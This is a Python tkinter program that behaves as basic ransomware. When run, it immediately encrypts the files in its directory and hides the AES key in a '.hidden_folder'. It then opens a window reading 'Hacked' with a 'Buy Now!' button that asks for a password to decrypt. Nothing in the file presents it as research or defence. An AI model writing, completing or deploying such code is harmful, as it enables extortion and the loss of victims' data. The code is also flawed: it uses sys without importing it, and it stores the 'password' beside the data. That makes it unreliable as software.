import os
import tkinter as tk
from tkinter import messagebox, simpledialog
from utils import (
    create_hidden_folder,
    save_key_to_dll,
    load_key_from_dll,
    get_file_tree,
    encrypt_and_store,
    decrypt_and_restore,
)

# Get the directory where the executable or script is located
BASE_DIR = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))

def encrypt_files():
    hidden_folder = os.path.join(BASE_DIR, ".hidden_folder")
    if not os.path.exists(hidden_folder):
        # Encrypt mode
        aes_key = os.urandom(16)
        file_tree, root_directory = get_file_tree()
        create_hidden_folder(hidden_folder)
        save_key_to_dll(hidden_folder, aes_key)
        output_file = os.path.join(hidden_folder, "encrypted_data.json")
        encrypt_and_store(file_tree, BASE_DIR, output_file, aes_key)  # Use BASE_DIR instead of root_directory
        messagebox.showinfo("Encryption Complete", "Files have been encrypted and stored.")
    else:
        messagebox.showwarning("Already Encrypted", "Files are already encrypted.")

def decrypt_files():
    hidden_folder = os.path.join(BASE_DIR, ".hidden_folder")
    if os.path.exists(hidden_folder):
        # Prompt user for password
        password = simpledialog.askstring("Password Required", "Enter the decryption password:", show="*")
        if not password:
            messagebox.showwarning("Decryption Canceled", "No password entered. Decryption canceled.")
            return

        # Load the AES key from the hidden folder
        aes_key = load_key_from_dll(hidden_folder)
        encrypted_file = os.path.join(hidden_folder, "encrypted_data.json")
        if not os.path.exists(encrypted_file):
            messagebox.showerror("Error", "Encrypted data file not found.")
            return

        # Verify password (for simplicity, assume the password is the hex representation of the AES key)
        if password != aes_key.hex():
            messagebox.showerror("Error", "Incorrect password. Decryption failed.")
            return

        # Decrypt files
        restore_directory = os.path.join(BASE_DIR, "restored")
        decrypt_and_restore(encrypted_file, restore_directory, aes_key)
        messagebox.showinfo("Decryption Complete", f"Files have been restored to {restore_directory}.")
    else:
        messagebox.showwarning("No Encrypted Data", "No encrypted data found to decrypt.")

def auto_check():
    hidden_folder = os.path.join(os.path.dirname(__file__), ".hidden_folder")
    if not os.path.exists(hidden_folder):
        # Automatically encrypt if no hidden folder exists
        encrypt_files()
        sys.exit(0)
    

def main():
    auto_check()
    root = tk.Tk()
    root.title("File Encryptor/Decryptor")

    tk.Label(root, text="Hacked", font=("Arial", 16)).pack(pady=10)


    
   


    decrypt_button = tk.Button(root, text="Buy Now!", command=decrypt_files, width=20, height=2)
    decrypt_button.pack(pady=10)

    root.mainloop()

if __name__ == "__main__":
    main()